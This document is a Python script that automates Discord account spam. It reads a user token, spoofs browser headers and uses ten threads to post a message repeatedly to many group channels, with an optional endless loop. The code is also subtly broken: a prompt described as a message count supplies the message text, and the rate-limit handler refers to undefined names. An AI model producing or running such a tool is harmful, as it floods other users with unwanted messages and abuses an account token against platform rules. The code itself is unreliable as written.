# make sure to look at the other files and sometimes you se something around "with open("...txt") as file:"
# this is defently better then just open(...) as it manage the files automatically and you will not need to close the files manually etc.
import requests
import threading
import random
import json
import colorama

open('log.txt', 'w').close()
message = input('Enter total Messages to be sent: ') # note: that Messages will be sent to the same group multiplie times if you choose a higher value then the number of groups you are in.
message_count = int(input('Enter Message Count: '))
config = json.load(open('config.json'))
token = config.get('token')

def sendreq():
    shit = open('group_id.txt')
    for _ in shit:
        l2 = random.choice(open('group_id.txt').readlines())
        already_checked = open('log.txt', mode='r')
        all_of_it = already_checked.read()
        check = all_of_it.find(l2)
        if check != -1: pass
        else:
            """
            ==========================================================================================================================================
            if you want to send messages in a loop, uncomment the 'while True' by removing the '#' and add a '#' at 'for line in range(message_count):'
            If you use 'while True' messages probably will be sent again in a group, they already where sent in!
            ==========================================================================================================================================
            """
            # while True:
            for _ in range(message_count):
                try:
                    with open("log.txt", "a+") as f: f.write(l2)
                    channelid = l2.strip('\n')

                    headers = {
                        "Authorization": token,
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
                        "accept": "*/*",
                        "referer": f"https://discord.com/channels/@me/{channelid}",
                        "host": "discord.com",
                        "connection": "keep-alive",
                        "orgin": "https://discord.com"
                    }

                    data = {
                        "content": message,
                        "tts": False
                    }

                    response = requests.post(f'https://discord.com/api/v9/channels/{channelid}/messages', data=data, headers=headers)
                    print(f'{colorama.Fore.LIGHTGREEN_EX}[+] Message Sent To {channelid} {colorama.Fore.RESET}\n')


                except:
                    print(f"{colorama.Fore.LIGHTRED_EX}[-] Message Not Sent To {channelid} => Ratelimit for {json_resp['retry_after']} seconds!{colorama.Fore.RESET}")
                    time.sleep(json_resp['retry_after'])

# changing the value of the variable "th" might cause connection issues and the whole code will run wayyy slower even if you put a higher number.
# this number do NOT mean the total requests. the number of connections at the same time is meant. the total connections are defined in for line in shit
# so the total number of connections equals to the lines of the group_id.txt file.
for i in range(10):
    t = threading.Thread(target=sendreq)
    t.start()
